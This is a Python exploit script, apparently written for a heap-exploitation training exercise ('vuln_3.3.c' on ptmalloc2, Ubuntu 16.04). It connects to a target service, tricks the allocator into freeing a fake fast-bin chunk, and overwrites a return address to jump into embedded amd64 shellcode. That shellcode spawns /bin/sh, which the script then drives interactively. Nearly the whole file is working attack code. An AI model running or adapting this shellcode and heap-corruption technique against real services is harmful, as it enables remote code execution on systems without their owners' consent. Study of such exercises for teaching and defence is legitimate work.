#!/usr/bin/python

#
# What: Exploit for vuln_3.3.c in ptmalloc2-ubuntu-16.04.4-64bit
# Author: Claes M. Nyberg
# When: Summer 2018
#

import struct
import socket
import sys
import os
import telnetlib
import random
import hashlib
import base64
import binascii

#
# Linux amd64 shellcode 
# execve('/bin/sh', ['/bin/sh', NULL], NULL) 
#
code = "\x48\xba\x2f\x2f\x62\x69"  # movabs $0x68732f6e69622f2f,%rdx
code += "\x6e\x2f\x73\x68"
code += "\x48\xc1\xea\x08"          # shr    $0x8,%rdx
code += "\x52"                      # push   %rdx
code += "\x48\x89\xe7"              # mov    %rsp,%rdi
code += "\x48\x31\xd2"              # xor    %rdx,%rdx
code += "\x52"                      # push   %rdx
code += "\x57"                      # push   %rdi
code += "\x48\x89\xe6"              # mov    %rsp,%rsi
code += "\x6a\x3b"                  # pushq  $0x3b
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 
code += "\x6a\x3c"                  # pushq  $0x3c
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 


def readuntil(s, content, echo = True):
	x = ""
	while True:
		y = s.recv(1)
		if not y:
			sys.stderr.write('[**] Error: FAILED TO READ FROM SOCKET\n')
			if echo:
				sys.stderr.write(x)
			return False
		x += y
		if x.endswith(content):
			if echo:
				sys.stderr.write(x)
			return x
		
def interact(sock):
	t = telnetlib.Telnet()                                                        
	t.sock = sock                                                                    
	t.interact()

def tcpconn(host, port, lport=0):
	target = (host, port)
	sock = socket.socket()
	bound = ''

	if lport != 0:
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(("", int(lport)))
		bound = " (from local port " + str(lport) + ")"

	print("[+] Connecting to " + target[0] + ":" + str(target[1]) + bound)
	try:
		sock.connect(target)
	except socket.error, msg:
		print("[**] Error: Failed to connect: " + str(msg))
		sys.exit(1)	
	return sock


if len(sys.argv) != 3:
	print "Usage: " + sys.argv[0] + " <ip> <port>"
	sys.exit(0)

s = tcpconn(sys.argv[1], int(sys.argv[2]), 0)

#import time
#time.sleep(10)

#-#-#-#-#-#-#-#-#-#-# Fun Stuff Goes Below

readuntil(s, "Please feed me a valid chunk size\n", True)
chunk_size = 0x40
print("[+] Using chunk size 0x%x" %(chunk_size))
s.send(struct.pack("<Q", chunk_size))

# Read the location of data 
data = readuntil(s, "\n")
data = data.split(' ')
addr = int(data[3], 16)
print("[+] Fake fast bin located at 0x%x" %(addr))

readuntil(s, "Please feed me a pointer to free\n", True) 
print("[+] Sending 0x%x as pointer to free (fake fast bin + 16)" %(addr+16))
s.send(struct.pack("<Q", addr + 16))

readuntil(s, "\n");
ret_addr = addr + 16 + 16
print("[+] Using shellcode of %u bytes" %(len(code)))
print("[+] Using return address 0x%x" %(ret_addr));
s.send(struct.pack("<Q", ret_addr)*2 + code + '\n')

s.send("id\n")
interact(s)
sys.exit(0)
